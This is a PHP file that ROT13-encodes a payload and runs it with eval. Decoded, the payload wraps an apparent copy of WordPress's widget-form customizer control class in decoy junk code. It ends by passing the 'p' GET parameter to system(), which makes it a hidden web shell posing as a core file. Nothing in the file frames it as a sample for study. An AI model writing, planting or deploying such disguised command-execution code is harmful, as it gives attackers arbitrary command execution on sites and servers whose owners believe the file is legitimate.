<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Jvqtrg_Sbez_Phfgbzvmr_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Jvqtrg Sbez Phfgbzvmr Pbageby pynff.
 *
 * @fvapr 3.9.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Jvqtrg_Sbez_Phfgbzvmr_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {
	/**
	 * Phfgbzvmr pbageby glcr.
	 *
	 * @fvapr 3.9.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'jvqtrg_sbez';

	/**
	 * Jvqtrg VQ.
	 *
	 * @fvapr 3.9.0
	 * @ine fgevat
	 */
	choyvp $jvqtrg_vq;

	/**
	 * Jvqtrg VQ onfr.
	 *
	 * @fvapr 3.9.0
	 * @ine fgevat
	 */
	choyvp $jvqtrg_vq_onfr;

	/**
	 * Fvqrone VQ.
	 *
	 * @fvapr 3.9.0
	 * @ine fgevat
	 */
	choyvp $fvqrone_vq;

	/**
	 * Jvqtrg fgnghf.
	 *
	 * @fvapr 3.9.0
	 * @ine obby Gehr vs arj, snyfr bgurejvfr. Qrsnhyg snyfr.
	 */
	choyvp $vf_arj = snyfr;

	/**
	 * Jvqtrg jvqgu.
	 *
	 * @fvapr 3.9.0
	 * @ine vag
	 */
	choyvp $jvqgu;

	/**
	 * Jvqtrg urvtug.
	 *
	 * @fvapr 3.9.0
	 * @ine vag
	 */
	choyvp $urvtug;

	/**
	 * Jvqtrg zbqr.
	 *
	 * @fvapr 3.9.0
	 * @ine obby Gehr vs jvqr, snyfr bgurejvfr. Qrsnhyg snyfr.
	 */
	choyvp $vf_jvqr = snyfr;

	/**
	 * Tngure pbageby cnenzf sbe rkcbegvat gb WninFpevcg.
	 *
	 * @fvapr 3.9.0
	 *
	 * @tybony neenl $jc_ertvfgrerq_jvqtrgf
	 */
	choyvp shapgvba gb_wfba() {
		tybony $jc_ertvfgrerq_jvqtrgf;

		cnerag::gb_wfba();
		$rkcbegrq_cebcregvrf = neenl( 'jvqtrg_vq', 'jvqtrg_vq_onfr', 'fvqrone_vq', 'jvqgu', 'urvtug', 'vf_jvqr' );
		sbernpu ( $rkcbegrq_cebcregvrf nf $xrl ) {
			$guvf->wfba[ $xrl ] = $guvf->$xrl;
		}

		// Trg gur jvqtrg_pbageby naq jvqtrg_pbagrag.
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/jvqtrgf.cuc';

		$jvqtrg = $jc_ertvfgrerq_jvqtrgf[ $guvf->jvqtrg_vq ];
		vs ( ! vffrg( $jvqtrg['cnenzf'][0] ) ) {
			$jvqtrg['cnenzf'][0] = neenl();
		}

		$netf = neenl(
			'jvqtrg_vq'   => $jvqtrg['vq'],
			'jvqtrg_anzr' => $jvqtrg['anzr'],
		);

		$netf                 = jc_yvfg_jvqtrg_pbagebyf_qlanzvp_fvqrone(
			neenl(
				0 => $netf,
				1 => $jvqtrg['cnenzf'][0],
			)
		);
		$jvqtrg_pbageby_cnegf = $guvf->znantre->jvqtrgf->trg_jvqtrg_pbageby_cnegf( $netf );

		$guvf->wfba['jvqtrg_pbageby'] = $jvqtrg_pbageby_cnegf['pbageby'];
		$guvf->wfba['jvqtrg_pbagrag'] = $jvqtrg_pbageby_cnegf['pbagrag'];
	}

	/**
	 * Bireevqr eraqre_pbagrag gb or ab-bc fvapr pbagrag vf rkcbegrq ivn gb_wfba sbe qrsreerq rzorqqvat.
	 *
	 * @fvapr 3.9.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Jurgure gur pheerag jvqtrg vf eraqrerq ba gur cntr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea obby Jurgure gur jvqtrg vf eraqrerq.
	 */
	choyvp shapgvba npgvir_pnyyonpx() {
		erghea $guvf->znantre->jvqtrgf->vf_jvqtrg_eraqrerq( $guvf->jvqtrg_vq );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>